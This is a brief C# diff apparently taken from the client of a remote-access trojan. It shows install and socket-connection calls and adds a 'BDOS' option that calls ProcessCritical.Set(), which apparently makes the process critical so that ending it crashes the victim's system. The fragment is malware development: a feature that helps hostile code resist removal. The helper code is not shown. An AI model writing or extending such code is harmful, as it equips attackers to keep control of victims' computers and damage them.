@@ -34,6 +34,9 @@ namespace Client
             if (Convert.ToBoolean(Settings.Install))
                 NormalStartup.Install();
 
+            if (Convert.ToBoolean(Settings.BDOS))
+                ProcessCritical.Set();
+
 #if DEBUG
             ClientSocket.InitializeClient();
 #else
